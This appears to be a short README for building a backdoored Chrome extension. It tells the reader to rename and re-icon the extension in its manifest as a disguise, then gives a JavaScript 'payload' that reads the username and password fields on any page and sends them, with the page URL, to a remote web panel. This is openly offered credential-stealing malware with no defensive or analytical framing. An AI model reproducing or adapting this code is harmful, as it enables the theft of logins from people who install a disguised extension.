![backdoor Chrome](http://s9.postimg.org/vvo5ncxy7/chrome.png)

## Change name, icones, description

change it on manifest

![Backdoor chrome](http://s15.postimg.org/yf0rmsfuj/rename.png)

## Create payload
```JavaScript
    function SITE()
    {
        var urls = window.location.href;
        var username = $('input[name=username]')[0].value; // exemple
        var pass = $('input[name=password]')[0].value; // exemple
        var phish = username+"-123-"+pass; // "-123-" separator
        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } ); // send to web panel
    }
```